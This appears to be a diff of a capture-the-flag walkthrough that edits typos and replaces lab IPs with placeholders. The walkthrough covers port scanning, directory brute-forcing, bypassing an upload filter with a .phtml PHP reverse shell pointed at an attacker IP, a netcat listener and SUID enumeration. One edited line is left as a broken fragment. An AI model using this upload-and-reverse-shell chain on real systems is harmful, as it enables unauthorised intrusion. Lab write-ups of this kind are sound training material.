@@ -29,7 +29,7 @@ Identified open ports:
     3128/tcp - Squid proxy (3.5.12)
     3333/tcp - Apache HTTP Server (2.4.18 Ubuntu)
 	
-	you can open the web page in url =  'http://10.10.34.169:3333/'
+	you can open the web page in url =  'http://<ip>:3333/'
 	
 Task 3:    Locating directories using Gobuster
 ------------------------------
@@ -57,11 +57,11 @@ we can leverage this to upload and execute our payload, which will lead to compr
 
 download file:
      https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-Before we proceed to test the upload form, we’ll need to change the IP address in the php reverse shell script. Set this to your attack machine’s IP address 
+Before we proceed to test the upload form, we’ll need to change the IP address in the php reverse shell script. Set this to your attacking machine’s IP address 
  You can also change the port if you’d like; this is a matter of preference. We just need to make sure that our listener is set to the same port so we will change it to  9001, A random port number above 9000
 
 
-so the lines are :
+so the lines in the php are :
   $ip = '10.10.231.94';  // CHANGE THIS   local IP not Remote IP
   $port = 9001;         // CHANGE THIS     A random port number above 9000
 
@@ -72,11 +72,11 @@ Do this in a terminal:
   and try to upload 
   the result is 'Extension not allowed'
   
-  So this extensio is not allowed
+  So this extension is not allowed
 
 
-Now we need t5o find wich extensio is allowed:
-  To do this, we'll use BurpSuite. We’re going to use Intruder (used to automate custom attacks). To start, make a wordlist with the following extensions:
+Now we need to find wich extension is allowed.
+   To start, make a wordlist with the following extensions:
 
 .php
 .php3
@@ -91,7 +91,7 @@ answer:
   
   the answer is   phtml
 
- goto http://10.10.121.171:3333/internal/index.php
+ goto http://<ip>:3333/internal/index.php
    and try to upload    'revershall.phtml'   and you'll get sucesss .
    
 
@@ -116,7 +116,7 @@ To gain remote access to this machine, follow these steps:
         Run the following command: nc -lvnp 9001.
   e.  run revershall.phtml'  from the 'internal/uploads/'  dir  
   f.  In the trminal you can run command on the remote host(  ls, whoami)
-  g.  In the terminal run : python -c "import pty; pty.spaw('/bin/bash')"
+  
   
  --------------------------------------------- 
   qusetion: What is the name of the user who manages the webserver? and the flag
@@ -170,7 +170,7 @@ output:
 /bin/umount
 /bin/systemctl
 /bin/fusermount
-....  find / -user root -perm -4000 -exec ls -ldb {} \;
+....  fi 
  Which file stands out?
 answer: /bin/systemctl
 
